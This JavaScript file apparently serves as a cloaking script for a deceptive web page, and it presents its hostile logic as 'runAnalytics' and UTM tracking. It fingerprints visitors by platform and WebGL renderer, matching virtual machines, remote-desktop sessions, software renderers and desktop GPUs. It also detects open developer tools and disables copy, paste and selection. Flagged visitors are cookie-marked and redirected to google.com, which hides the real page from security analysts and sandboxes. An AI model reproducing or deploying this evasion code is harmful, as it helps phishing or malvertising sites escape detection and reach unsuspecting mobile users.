
(function () {
    var g = window;
    var doc = g.document;
    var _u = "https://google.com/";
    var _s = false;
    var _a = "utm_" + "parameters";
  
  
    var _pcVmGl = [
     
      "llvmpipe",
      "softpipe",
      "software rasterizer",
      "microsoft basic render",
      "gdi generic",
      "basic render",
  
   
      "virtualbox",
      "vmware",
      "parallels",
      "qemu",
      "xen",
      "hyper-v",
      "kvm",
      "virgl",
      "svga3d",
  
     
      "remote",
      "rdp",
      "vnc",
  
   
      "geforce",
      "quadro",
      "rtx",
      "gtx",
      "radeon",
      "amd radeon",
      "intel hd",
      "intel uhd",
      "intel iris",
      "arc",
      "nouveau"
    ];
  
    function _gl() {
      try {
        var c = doc.createElement("canvas");
        var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
        if (!gl) return "";
        var ext = gl.getExtension("WEBGL_debug_renderer_info");
        if (!ext) return "";
        return (gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
      } catch (e) { return ""; }
    }
  
    function _r() {
      if (_s) return;
      _s = true;
      var fd = new FormData();
      fd.append("evt", "init_validate");
      fetch("/api/validate", { method: "POST", body: fd })
        .then(function (r) { return r.json().catch(function () { return {}; }); })
        .then(function (d) {
          try {
            if (d && d.setUtm) {
              g.localStorage.setItem(_a, "true");
              g.document.cookie = _a + "=true;path=/;max-age=31536000;SameSite=Lax";
            }
          } catch (e) {}
          setTimeout(function () { g.location.href = _u; }, 200);
        })
        .catch(function () {
          setTimeout(function () { g.location.href = _u; }, 200);
        });
    }
  
    g.runAnalytics = _r;
   
    if (g.DisableDevtool) {
      g.DisableDevtool({
        ondevtoolopen: _r,
        disableMenu: true,
        disableSelect: true,
        disableCopy: true,
        disableCut: true,
        disablePaste: true
      });
    }
  
    doc.addEventListener("DOMContentLoaded", function () {
      var nav = g.navigator;
      var ua = (nav && nav.userAgent) || "";
      var p = (nav && nav.platform) || "";
      var uaLower = ua.toLowerCase();

      

      var w = ["Win32", "Win64", "Windows", "WinCE"];
      var m = ["Macintosh", "MacIntel", "MacPPC", "Mac68K"];
  
      var pl = (p || "").toLowerCase();
      
  
      if (w.indexOf(p) !== -1 || m.indexOf(p) !== -1) {
        _r();
        return;
      }
  
  
      var glStr = _gl();
      if (glStr) {
        for (var i = 0; i < _pcVmGl.length; i++) {
          if (glStr.indexOf(_pcVmGl[i]) !== -1) {
            _r();
            return;
          }
        }
      }
    });
  })();
